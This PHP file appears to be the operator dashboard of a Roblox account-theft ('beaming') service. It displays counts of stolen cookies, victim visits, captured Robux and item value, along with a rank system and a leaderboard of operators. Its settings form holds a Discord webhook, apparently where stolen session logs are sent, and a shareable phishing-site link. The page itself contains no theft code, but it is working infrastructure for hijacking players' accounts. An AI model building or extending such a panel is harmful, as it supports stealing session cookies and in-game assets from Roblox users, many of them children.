<?php
session_start();

if (!isset($_SESSION['token'])) {
    header('Location: sign-in.php');
    exit;
}

require_once '../config.php';
require_once '../functions.php';

$token = $_SESSION['token'];
$tokenData = getTokenData($token);

if (!$tokenData) {
    session_destroy();
    header('Location: sign-in.php');
    exit;
}

$dir = $tokenData['directory'];
$instanceData = getInstanceData($dir);

if (!$instanceData) {
    session_destroy();
    header('Location: sign-in.php');
    exit;
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $errors = [];
    
    $newUsername = trim($_POST['username'] ?? '');
    $newPfp = trim($_POST['pfp'] ?? '');
    $newWebhook = trim($_POST['webhook'] ?? '');
    
    if (!empty($newUsername) && (strlen($newUsername) < 3 || strlen($newUsername) > 20)) {
        $errors[] = 'Username must be 3-20 characters';
    }
    
    if (!empty($newPfp) && !filter_var($newPfp, FILTER_VALIDATE_URL)) {
        $errors[] = 'Invalid profile picture URL';
    }
    
    if (!empty($newWebhook) && !validateWebhook($newWebhook)) {
        $errors[] = 'Invalid webhook URL';
    }
    
    if (empty($errors)) {
        if (!empty($newUsername)) {
            $instanceData['username'] = $newUsername;
        }
        if (!empty($newPfp)) {
            $instanceData['profilePicture'] = $newPfp;
        }
        if (!empty($newWebhook)) {
            $instanceData['userWebhook'] = $newWebhook;
            $tokenData['webhook'] = $newWebhook;
            saveTokenData($token, $tokenData);
        }
        
        saveInstanceData($dir, $instanceData);
        $success = 'Settings updated successfully!';
    }
}

$stats = $instanceData['stats'];
$dailyStats = $instanceData['dailyStats'];
$username = $instanceData['username'] ?? 'Beammer';
$pfp = $instanceData['profilePicture'] ?? 'https://hyperblox.eu/files/img.png';
$webhook = $instanceData['userWebhook'];
$siteUrl = FULL_URL . '/' . $dir;

$rankInfo = getRankInfo($stats['totalCookies']);
$leaderboard = getLeaderboard(5);

$today = date('w');
$yesterday = ($today - 1 + 7) % 7;

function calculateChange($today, $yesterday) {
    if ($yesterday == 0) return 100;
    return round((($today - $yesterday) / $yesterday) * 100);
}

$cookiesChange = calculateChange($dailyStats['cookies'][$today], $dailyStats['cookies'][$yesterday]);
$visitsChange = calculateChange($dailyStats['visits'][$today], $dailyStats['visits'][$yesterday]);
$robuxChange = calculateChange($dailyStats['robux'][$today], $dailyStats['robux'][$yesterday]);
$rapChange = calculateChange($dailyStats['rap'][$today], $dailyStats['rap'][$yesterday]);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard - <?php echo htmlspecialchars($username); ?></title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&display=swap" rel="stylesheet">
    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root {
            --primary: #3b82f6;
            --success: #10b981;
            --danger: #ef4444;
            --warning: #f59e0b;
            --dark-bg: #0a0f1e;
            --dark-card: #1a2332;
            --text-primary: #ffffff;
            --text-secondary: #94a3b8;
        }
        body {
            font-family: 'Inter', sans-serif;
            background: var(--dark-bg);
            background-image: 
                radial-gradient(at 80% 0%, rgba(59, 130, 246, 0.15) 0px, transparent 50%),
                radial-gradient(at 0% 50%, rgba(139, 92, 246, 0.15) 0px, transparent 50%);
            min-height: 100vh;
            color: var(--text-primary);
        }
        .container {
            max-width: 1400px;
            margin: 0 auto;
            padding: 20px;
        }
        .dashboard-grid {
            display: grid;
            grid-template-columns: 260px 1fr;
            gap: 20px;
        }
        .sidebar {
            background: rgba(26, 35, 50, 0.85);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(100, 150, 255, 0.15);
            border-radius: 16px;
            padding: 20px;
            height: fit-content;
            position: sticky;
            top: 20px;
        }
        .profile {
            text-align: center;
            margin-bottom: 30px;
            padding-bottom: 20px;
            border-bottom: 1px solid rgba(100, 150, 255, 0.15);
        }
        .profile img {
            width: 80px;
            height: 80px;
            border-radius: 50%;
            border: 3px solid var(--primary);
            margin-bottom: 12px;
        }
        .profile h3 {
            font-size: 18px;
            margin-bottom: 4px;
        }
        .profile p {
            font-size: 13px;
            color: var(--text-secondary);
        }
        .nav-menu {
            display: flex;
            flex-direction: column;
            gap: 8px;
        }
        .nav-item {
            display: flex;
            align-items: center;
            gap: 12px;
            padding: 12px 16px;
            border-radius: 10px;
            color: var(--text-secondary);
            cursor: pointer;
            transition: all 0.3s;
        }
        .nav-item:hover, .nav-item.active {
            background: rgba(59, 130, 246, 0.2);
            color: var(--text-primary);
        }
        .nav-item i {
            font-size: 18px;
            width: 24px;
        }
        .main-content {
            display: flex;
            flex-direction: column;
            gap: 20px;
        }
        .top-bar {
            background: rgba(26, 35, 50, 0.85);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(100, 150, 255, 0.15);
            border-radius: 16px;
            padding: 20px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
        }
        .top-bar h1 {
            font-size: 28px;
            font-weight: 700;
        }
        .top-bar-actions {
            display: flex;
            gap: 10px;
        }
        .btn {
            padding: 10px 20px;
            border-radius: 10px;
            border: none;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            display: inline-flex;
            align-items: center;
            gap: 8px;
            font-size: 14px;
        }
        .btn-primary {
            background: linear-gradient(135deg, var(--primary), #2563eb);
            color: white;
        }
        .btn-primary:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 20px rgba(59, 130, 246, 0.4);
        }
        .btn-danger {
            background: rgba(239, 68, 68, 0.2);
            border: 1px solid rgba(239, 68, 68, 0.3);
            color: #ef4444;
        }
        .btn-danger:hover {
            background: rgba(239, 68, 68, 0.3);
        }
        .stats-grid {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
            gap: 20px;
        }
        .stat-card {
            background: rgba(26, 35, 50, 0.85);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(100, 150, 255, 0.15);
            border-radius: 16px;
            padding: 24px;
            transition: all 0.3s;
        }
        .stat-card:hover {
            transform: translateY(-5px);
            box-shadow: 0 15px 40px rgba(0, 0, 0, 0.3);
        }
        .stat-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 16px;
        }
        .stat-title {
            font-size: 14px;
            color: var(--text-secondary);
            font-weight: 600;
            text-transform: uppercase;
        }
        .stat-change {
            display: flex;
            align-items: center;
            gap: 4px;
            font-size: 13px;
            font-weight: 600;
        }
        .stat-change.positive { color: var(--success); }
        .stat-change.negative { color: var(--danger); }
        .stat-value {
            font-size: 32px;
            font-weight: 800;
            margin-bottom: 12px;
        }
        .stat-chart {
            height: 80px;
            margin-top: 16px;
        }
        .rank-card {
            background: rgba(26, 35, 50, 0.85);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(100, 150, 255, 0.15);
            border-radius: 16px;
            padding: 24px;
        }
        .rank-header {
            font-size: 20px;
            font-weight: 700;
            margin-bottom: 20px;
        }
        .rank-info {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 16px;
            margin-bottom: 20px;
        }
        .rank-item {
            display: flex;
            flex-direction: column;
        }
        .rank-label {
            font-size: 13px;
            color: var(--text-secondary);
            margin-bottom: 4px;
        }
        .rank-value {
            font-size: 16px;
            font-weight: 600;
        }
        .progress-bar {
            height: 8px;
            background: rgba(255, 255, 255, 0.1);
            border-radius: 4px;
            overflow: hidden;
        }
        .progress-fill {
            height: 100%;
            background: linear-gradient(90deg, var(--primary), #8b5cf6);
            border-radius: 4px;
            transition: width 0.5s ease;
        }
        .leaderboard-card {
            background: rgba(26, 35, 50, 0.85);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(100, 150, 255, 0.15);
            border-radius: 16px;
            padding: 24px;
        }
        .leaderboard-header {
            font-size: 20px;
            font-weight: 700;
            margin-bottom: 20px;
        }
        .leaderboard-list {
            display: flex;
            flex-direction: column;
            gap: 12px;
        }
        .leaderboard-item {
            display: flex;
            align-items: center;
            gap: 16px;
            padding: 12px;
            background: rgba(15, 23, 42, 0.4);
            border-radius: 10px;
            transition: all 0.3s;
        }
        .leaderboard-item:hover {
            background: rgba(59, 130, 246, 0.2);
        }
        .leaderboard-rank {
            font-size: 20px;
            font-weight: 700;
            width: 30px;
            text-align: center;
        }
        .leaderboard-avatar {
            width: 40px;
            height: 40px;
            border-radius: 50%;
            border: 2px solid var(--primary);
        }
        .leaderboard-info {
            flex: 1;
        }
        .leaderboard-name {
            font-weight: 600;
            margin-bottom: 2px;
        }
        .leaderboard-stats {
            font-size: 12px;
            color: var(--text-secondary);
        }
        .settings-card {
            background: rgba(26, 35, 50, 0.85);
            backdrop-filter: blur(20px);
            border: 1px solid rgba(100, 150, 255, 0.15);
            border-radius: 16px;
            padding: 24px;
            display: none;
        }
        .settings-header {
            font-size: 20px;
            font-weight: 700;
            margin-bottom: 20px;
        }
        .form-group {
            margin-bottom: 20px;
        }
        label {
            display: block;
            font-size: 14px;
            font-weight: 600;
            margin-bottom: 8px;
            color: var(--text-secondary);
        }
        input[type="text"], input[type="url"] {
            width: 100%;
            padding: 12px 16px;
            background: rgba(15, 23, 42, 0.6);
            border: 2px solid rgba(100, 150, 255, 0.15);
            border-radius: 10px;
            color: var(--text-primary);
            font-size: 14px;
            font-family: inherit;
        }
        input:focus {
            outline: none;
            border-color: var(--primary);
            background: rgba(15, 23, 42, 0.9);
        }
        .alert {
            padding: 12px 16px;
            border-radius: 10px;
            margin-bottom: 20px;
            font-size: 14px;
        }
        .alert-success {
            background: rgba(16, 185, 129, 0.1);
            border: 1px solid rgba(16, 185, 129, 0.3);
            color: var(--success);
        }
        .alert-danger {
            background: rgba(239, 68, 68, 0.1);
            border: 1px solid rgba(239, 68, 68, 0.3);
            color: var(--danger);
        }
        @media (max-width: 1024px) {
            .dashboard-grid {
                grid-template-columns: 1fr;
            }
            .sidebar {
                position: static;
            }
        }
        @media (max-width: 768px) {
            .stats-grid {
                grid-template-columns: 1fr;
            }
            .top-bar {
                flex-direction: column;
                gap: 15px;
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="dashboard-grid">
            <div class="sidebar">
                <div class="profile">
                    <img src="<?php echo htmlspecialchars($pfp); ?>" alt="Profile">
                    <h3><?php echo htmlspecialchars($username); ?></h3>
                    <p><?php echo htmlspecialchars($rankInfo['currentRank']); ?></p>
                </div>
                
                <div class="nav-menu">
                    <div class="nav-item active" onclick="showDashboard()">
                        <i class="fas fa-chart-line"></i>
                        <span>Dashboard</span>
                    </div>
                    <div class="nav-item" onclick="showSettings()">
                        <i class="fas fa-cog"></i>
                        <span>Settings</span>
                    </div>
                    <div class="nav-item" onclick="window.open('<?php echo htmlspecialchars($siteUrl); ?>', '_blank')">
                        <i class="fas fa-external-link-alt"></i>
                        <span>Visit Site</span>
                    </div>
                    <div class="nav-item" onclick="location.href='logout.php'">
                        <i class="fas fa-sign-out-alt"></i>
                        <span>Logout</span>
                    </div>
                </div>
            </div>
            
            <div class="main-content">
                <div class="top-bar">
                    <h1>Dashboard</h1>
                    <div class="top-bar-actions">
                        <button class="btn btn-primary" onclick="copyLink()">
                            <i class="fas fa-copy"></i>
                            Copy Link
                        </button>
                        <button class="btn btn-danger" onclick="location.href='logout.php'">
                            <i class="fas fa-sign-out-alt"></i>
                            Logout
                        </button>
                    </div>
                </div>
                
                <div id="dashboardContent">
                    <div class="stats-grid">
                        <div class="stat-card">
                            <div class="stat-header">
                                <div class="stat-title">Total Cookies</div>
                                <div class="stat-change <?php echo $cookiesChange >= 0 ? 'positive' : 'negative'; ?>">
                                    <i class="fas fa-arrow-<?php echo $cookiesChange >= 0 ? 'up' : 'down'; ?>"></i>
                                    <?php echo abs($cookiesChange); ?>%
                                </div>
                            </div>
                            <div class="stat-value"><?php echo number_format($stats['totalCookies']); ?></div>
                            <div class="stat-chart">
                                <canvas id="cookiesChart"></canvas>
                            </div>
                        </div>
                        
                        <div class="stat-card">
                            <div class="stat-header">
                                <div class="stat-title">Total Visits</div>
                                <div class="stat-change <?php echo $visitsChange >= 0 ? 'positive' : 'negative'; ?>">
                                    <i class="fas fa-arrow-<?php echo $visitsChange >= 0 ? 'up' : 'down'; ?>"></i>
                                    <?php echo abs($visitsChange); ?>%
                                </div>
                            </div>
                            <div class="stat-value"><?php echo number_format($stats['totalVisits']); ?></div>
                            <div class="stat-chart">
                                <canvas id="visitsChart"></canvas>
                            </div>
                        </div>
                        
                        <div class="stat-card">
                            <div class="stat-header">
                                <div class="stat-title">Total Robux</div>
                                <div class="stat-change <?php echo $robuxChange >= 0 ? 'positive' : 'negative'; ?>">
                                    <i class="fas fa-arrow-<?php echo $robuxChange >= 0 ? 'up' : 'down'; ?>"></i>
                                    <?php echo abs($robuxChange); ?>%
                                </div>
                            </div>
                            <div class="stat-value"><?php echo number_format($stats['totalRobux']); ?></div>
                            <div class="stat-chart">
                                <canvas id="robuxChart"></canvas>
                            </div>
                        </div>
                        
                        <div class="stat-card">
                            <div class="stat-header">
                                <div class="stat-title">Total RAP</div>
                                <div class="stat-change <?php echo $rapChange >= 0 ? 'positive' : 'negative'; ?>">
                                    <i class="fas fa-arrow-<?php echo $rapChange >= 0 ? 'up' : 'down'; ?>"></i>
                                    <?php echo abs($rapChange); ?>%
                                </div>
                            </div>
                            <div class="stat-value"><?php echo number_format($stats['totalRAP']); ?></div>
                            <div class="stat-chart">
                                <canvas id="rapChart"></canvas>
                            </div>
                        </div>
                    </div>
                    
                    <div class="rank-card">
                        <div class="rank-header">Rank Progress</div>
                        <div class="rank-info">
                            <div class="rank-item">
                                <div class="rank-label">Current Rank</div>
                                <div class="rank-value"><?php echo htmlspecialchars($rankInfo['currentRank']); ?></div>
                            </div>
                            <div class="rank-item">
                                <div class="rank-label">Next Rank</div>
                                <div class="rank-value"><?php echo htmlspecialchars($rankInfo['nextRank']); ?></div>
                            </div>
                            <div class="rank-item">
                                <div class="rank-label">Progress</div>
                                <div class="rank-value"><?php echo $rankInfo['progress']; ?>%</div>
                            </div>
                            <div class="rank-item">
                                <div class="rank-label">Logs to Next</div>
                                <div class="rank-value"><?php echo $rankInfo['logsToNextRank']; ?></div>
                            </div>
                        </div>
                        <div class="progress-bar">
                            <div class="progress-fill" style="width: <?php echo $rankInfo['progress']; ?>%"></div>
                        </div>
                    </div>
                    
                    <div class="leaderboard-card">
                        <div class="leaderboard-header">🏆 Top 5 Leaderboard</div>
                        <div class="leaderboard-list">
                            <?php foreach ($leaderboard as $index => $item): ?>
                            <div class="leaderboard-item">
                                <div class="leaderboard-rank"><?php echo $index + 1; ?></div>
                                <img src="<?php echo htmlspecialchars($item['profilePicture'] ?? 'https://hyperblox.eu/files/img.png'); ?>" alt="Avatar" class="leaderboard-avatar">
                                <div class="leaderboard-info">
                                    <div class="leaderboard-name"><?php echo htmlspecialchars($item['username'] ?? 'Unknown'); ?></div>
                                    <div class="leaderboard-stats"><?php echo number_format($item['stats']['totalCookies']); ?> cookies • <?php echo number_format($item['stats']['totalVisits']); ?> visits</div>
                                </div>
                            </div>
                            <?php endforeach; ?>
                        </div>
                    </div>
                </div>
                
                <div class="settings-card" id="settingsContent">
                    <div class="settings-header">Settings</div>
                    
                    <?php if (isset($success)): ?>
                    <div class="alert alert-success">
                        <i class="fas fa-check-circle"></i> <?php echo htmlspecialchars($success); ?>
                    </div>
                    <?php endif; ?>
                    
                    <?php if (isset($errors) && !empty($errors)): ?>
                    <div class="alert alert-danger">
                        <i class="fas fa-exclamation-circle"></i> <?php echo implode('<br>', array_map('htmlspecialchars', $errors)); ?>
                    </div>
                    <?php endif; ?>
                    
                    <form method="POST">
                        <div class="form-group">
                            <label>Username</label>
                            <input type="text" name="username" value="<?php echo htmlspecialchars($username); ?>" placeholder="Your username">
                        </div>
                        
                        <div class="form-group">
                            <label>Profile Picture URL</label>
                            <input type="url" name="pfp" value="<?php echo htmlspecialchars($pfp); ?>" placeholder="https://...">
                        </div>
                        
                        <div class="form-group">
                            <label>Webhook URL</label>
                            <input type="url" name="webhook" value="<?php echo htmlspecialchars($webhook); ?>" placeholder="https://discord.com/api/webhooks/...">
                        </div>
                        
                        <div class="form-group">
                            <label>Site URL (Read Only)</label>
                            <input type="text" value="<?php echo htmlspecialchars($siteUrl); ?>" readonly>
                        </div>
                        
                        <div class="form-group">
                            <label>Access Token (Read Only)</label>
                            <input type="text" value="<?php echo htmlspecialchars($token); ?>" readonly>
                        </div>
                        
                        <button type="submit" class="btn btn-primary" style="width: 100%;">
                            <i class="fas fa-save"></i>
                            Save Changes
                        </button>
                    </form>
                </div>
            </div>
        </div>
    </div>

    <script>
        const chartOptions = {
            responsive: true,
            maintainAspectRatio: false,
            plugins: {
                legend: { display: false },
                tooltip: {
                    backgroundColor: '#1a2332',
                    titleColor: '#60a5fa',
                    bodyColor: '#f8fafc',
                    borderColor: 'rgba(100, 150, 255, 0.15)',
                    borderWidth: 1,
                    padding: 10,
                    displayColors: false
                }
            },
            scales: {
                y: {
                    beginAtZero: true,
                    display: false,
                    grid: { display: false }
                },
                x: {
                    display: false,
                    grid: { display: false }
                }
            },
            elements: {
                point: { radius: 0, hoverRadius: 4 },
                line: { borderWidth: 2, tension: 0.4 }
            }
        };

        new Chart(document.getElementById('cookiesChart'), {
            type: 'line',
            data: {
                labels: ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'],
                datasets: [{
                    data: <?php echo json_encode($dailyStats['cookies']); ?>,
                    borderColor: '#3b82f6',
                    backgroundColor: 'rgba(59, 130, 246, 0.1)',
                    fill: true
                }]
            },
            options: chartOptions
        });

        new Chart(document.getElementById('visitsChart'), {
            type: 'line',
            data: {
                labels: ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'],
                datasets: [{
                    data: <?php echo json_encode($dailyStats['visits']); ?>,
                    borderColor: '#8b5cf6',
                    backgroundColor: 'rgba(139, 92, 246, 0.1)',
                    fill: true
                }]
            },
            options: chartOptions
        });

        new Chart(document.getElementById('robuxChart'), {
            type: 'line',
            data: {
                labels: ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'],
                datasets: [{
                    data: <?php echo json_encode($dailyStats['robux']); ?>,
                    borderColor: '#10b981',
                    backgroundColor: 'rgba(16, 185, 129, 0.1)',
                    fill: true
                }]
            },
            options: chartOptions
        });

        new Chart(document.getElementById('rapChart'), {
            type: 'line',
            data: {
                labels: ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'],
                datasets: [{
                    data: <?php echo json_encode($dailyStats['rap']); ?>,
                    borderColor: '#f59e0b',
                    backgroundColor: 'rgba(245, 158, 11, 0.1)',
                    fill: true
                }]
            },
            options: chartOptions
        });

        function showDashboard() {
            document.getElementById('dashboardContent').style.display = 'block';
            document.getElementById('settingsContent').style.display = 'none';
            document.querySelectorAll('.nav-item')[0].classList.add('active');
            document.querySelectorAll('.nav-item')[1].classList.remove('active');
        }

        function showSettings() {
            document.getElementById('dashboardContent').style.display = 'none';
            document.getElementById('settingsContent').style.display = 'block';
            document.querySelectorAll('.nav-item')[0].classList.remove('active');
            document.querySelectorAll('.nav-item')[1].classList.add('active');
        }

        function copyLink() {
            const link = '<?php echo htmlspecialchars($siteUrl); ?>';
            navigator.clipboard.writeText(link).then(() => {
                alert('Link copied to clipboard!');
            });
        }
    </script>
</body>
</html>